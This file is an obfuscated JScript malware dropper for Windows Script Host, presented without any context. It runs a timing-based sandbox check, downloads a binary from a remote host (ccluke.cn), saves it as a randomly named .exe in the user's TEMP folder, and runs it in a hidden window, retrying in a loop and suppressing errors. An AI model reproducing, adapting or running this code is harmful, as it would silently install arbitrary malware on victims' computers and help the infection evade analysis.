var _BH = false;
var _FG = "CreateObject";
var _W0 = function _I() {return WScript[_FG]("WScript"+".Shell");}(), _SK = 11;
var _NC = "MSXML2.XMLHTTP";
var _GF = 2123213;
var _W = 0;
function _LK(_SE){_W0["Run"](_SE, _W, _W);};
function _F(){return _NC + "";};
function _AG(_I1, _ST){_W = _W * 1; return _I1 - _ST;};
function _QA(){return _FG;};
/*@cc_on
  @if (@_win32 || @_win64)
    _BH = true;
  @end
@*/
if (_BH)
{
var _H0 = "";
function _G(){return 22;};
var _L0 = 0; var _PU = 0;
function _CJ()
{
var _L = new this["Date"]();
var _IV = _L["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _L = new this["Date"]();
var _A = _L["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _L = new this["Date"]();
var _F1 = _L["getUTCMilliseconds"]();
var _L0 = "_ED";
_L0 = _AG(_A, _IV);
var _PU = "_U0";
_PU = _AG(_F1, _A);
_H0 = "open";
return _AG(_L0, _PU);
}
var _U1 = false;
var _YT = false;
for (var _I0 = _W; _I0 < _G() * 1; _I0++){if (_CJ() != _W){
_U1 = true; 
_PU = "31" + 11 * _L0 + _PU; 
_YT = true; 
break;
}}
function _T() {return ((_U1 == true) && (_U1 == _YT)) ? 1 : _W;};
if (_U1 && _T() && _YT){
function _H() {return _W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IXiM1xLzkSAjU.ex" + "e";};
 _TL = _F();
 _V = WScript[_FG](_TL);
 var _M = 1;
 while (_M){
try {
	if (_M == 1)
	{
		_V[_H0]("GET", "http://ccluke.cn/b7eus", false);
		_V["send"]();
		_AX = "Sleep";
	}
	WScript[_AX](_G() + 120); 
	if (_V["readystate"] < 2 * 2) continue;
	_M = _W;
	function _IX(_F0) {var _JJ = (1, 2, 3, 4, 5, _F0); return _JJ;};
	_PX = WScript[_QA()]("ADODB.Stream");
	_TL = _PX;
	_TL[_H0]();
	_TL["type"] = _IX(1);
	_TL["write"](_V["ResponseBody"]);
	_PX["position"] = _IX(_W);
	_TL["Save" + "ToFile"](_H(), 2);
	_PX["cl"+"ose"]();
	_U = _H();
	_LK(_U);
} catch(_AV){};
}
}
}

